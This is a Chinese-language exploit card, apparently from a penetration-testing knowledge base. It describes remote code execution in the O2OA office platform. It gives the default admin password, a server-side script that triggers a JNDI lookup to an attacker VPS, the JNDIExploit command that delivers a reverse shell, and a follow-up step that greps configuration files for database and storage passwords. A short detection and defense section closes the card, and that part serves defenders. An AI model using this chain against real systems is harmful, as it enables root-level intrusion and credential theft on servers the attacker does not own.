---
id: web-java-component-o2oa-default-credential-invoke-jndi-rce
title: O2OA 默认口令登录后「添加接口」驻入 Java.type 代码，通过 JNDI 外带实现 RCE
type: scenario
domain: web
path: web/java/component
technique: o2oa-invoke-default-credential-jndi
tags:
- o2oa
- oa
- default-credential
- jndi
- ldap
- rce
- java
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:13:21+08:00'
  notes: 已对照原文核对（默认口令 xadmin/o2oa@2022、添加接口 Java.type InitialContext doLookup、JNDIExploit、grep config 取 MinIO/DB 口令均一致）；本次核对未读取图片，仅依据正文；后台入口路径 x_desktop 为补充推断，原文未给出具体 URI
url: /docs/web/java/component/web-java-component-o2oa-default-credential-invoke-jndi-rce/
draft: false
kb_aliases:
- O2OA invoke 接口命令执行
- O2OA xadmin/o2oa@2022 默认口令
- CNVD-2020-18740
- O2OA 添加接口 JNDI 注入
- O2OA InitialContext doLookup
---

## 一句话结论

O2OA 的 `xadmin` 账号出厂口令未改（`o2oa@2022`）时，攻击者登录管理后台用「添加接口」功能写入 Nashorn/JS 脚本，脚本里 `Java.type("javax.naming.InitialContext").doLookup("ldap://...")` 即触发 JNDI 注入，由 JNDIExploit 一类工具返回恶意 Reference，最终在 o2server 进程内执行命令并拿到 root shell。

## 原理

- O2OA 的「接口（invoke）」功能允许管理员录入 JavaScript 脚本，脚本由服务器端 JS 引擎（Nashorn）直接执行，因此 `Java.type(...)` 可以取到任意 Java 类——这本身就是设计上的代码执行面。
- 只要拿到管理员身份，这个功能就从「低代码编排」变成「任意 Java 代码执行」。真正的边界是认证，不是代码能力。
- `javax.naming.InitialContext.doLookup()` 会把字符串当作 JNDI 名称解析；攻击者控制的 LDAP/RMI 服务返回带 `javaSerializedData` 的 `Reference`，客户端 `lookup` 时反序列化 gadget（CommonsBeanutils1 等），在 O2OA 进程上下文里执行 `Runtime.exec`。
- JDK 高版本对 JNDI 远程 codebase 有限制，但序列化 gadget 走的是 `javaSerializedData`，不依赖远程类加载，所以仍能打通；这也是为什么用 JNDIExploit 的 `Deserialization/CommonsBeanutils1/ReverseShell` 路径。
- 命令执行身份是启动 o2server 的账号。原文环境里进程以 root 运行（`/opt/o2server` 下 grep 配置），所以直接是 root。

## 触发条件

- 目标 O2OA 使用默认 `xadmin/o2oa@2022`，或口令被撞库/复用。
- 后台「添加接口」功能未被裁剪，服务器端 JS 引擎可访问 `Java.type`。
- 服务器到攻击者 VPS 的 LDAP（1389）与 HTTP（8000，供 JNDIExploit 的本地 class 服务）可达；若不出网则只能改打本地 gadget。
- 目标 JDK 的反序列化 gadget 在 classpath 上（O2OA 自带依赖里通常有时间接可用的链）。

## 利用步骤

1. 用默认口令登录 `http://TARGET/x_desktop/`（或对应后台入口），账号 `xadmin`，口令 `o2oa@2022`。
2. 进入「应用/接口」管理，新建一个接口，脚本内容写成：

```js
var a = mainOutput();
function mainOutput() {
    var aaa = Java.type("javax.naming.InitialContext");
    aaa.doLookup("ldap://VPS:1389/Deserialization/CommonsBeanutils1/ReverseShell/VPS/250");
};
```

3. VPS 上起 JNDI 利用服务（版本差异不大，任何支持 LDAP + 本地 class 服务的工具都可）：

```bash
java -jar JNDIExploit-2.0-SNAPSHOT.jar -l 1389 -p 8000 -i VPS
```

4. 回到后台点「执行」该接口，服务器侧触发 lookup，反序列化 payload 后在 VPS 的 250 端口得到 shell。
5. 落地后翻配置拿横向凭据：`grep -r "password" /opt/o2server/config` 常见命中 `token.json`、`externalDataSources.json`、`externalStorageSources.json`（MinIO/数据库口令），可继续打内网对象存储与数据库。

## PoC

后台接口脚本（最小化）：

```js
Java.type("javax.naming.InitialContext").doLookup("ldap://VPS:1389/Deserialization/CommonsBeanutils1/ReverseShell/VPS/250");
```

若只需要验证漏洞存在（不带 gadget），把 lookup 指向自建 LDAP 并观察回连即证明 JNDI 可达：

```bash
# VPS 侧
nc -lvnp 1389
```

## 变体与关联

- 变体：`mainOutput()` 里也可直接 `Java.type("java.lang.Runtime").getRuntime().exec(...)`，不走 JNDI——本卡之所以强调 JNDI，是因为原环境对直接 exec 有额外限制/更易被拦，且 JNDI 便于复用现成 gadget 工具。
- 变体：口令非默认时先做 O2OA 默认口令喷洒，或从其他系统泄露的配置里取 `token.json` 口令。
- 关联：[[web-java-framework-webwork2-ognl-s2053-rce]]（同类「后台功能即代码执行面」的产品化思路）。
- 关联：同类 OA/低代码平台应重点审计「脚本/表达式编辑」功能是否只靠登录态保护。

## 检测与防御

- 防御：改掉 `xadmin` 默认口令并启用强口令策略；后台限制来源 IP；禁用或白名单「接口脚本」的 Java 类访问（Nashorn `ClassFilter`）。
- 防御：出网白名单，禁止 o2server 主动外连 LDAP/RMI 端口；JDK 升级到关闭远程 codebase 的版本只是缓解，不能替代 gadget 治理。
- 检测：o2server 进程向 1389/1099 等端口发起连接；`InitialContext`/`doLookup` 出现在接口脚本里；后台 `xadmin` 从异常 IP 登录并新增接口；`/opt/o2server/config` 被批量读取。
- 响应：删除恶意接口脚本、轮换 O2OA 与配置内所有口令、检查 o2server 进程下是否已有落地的定时任务/公钥。
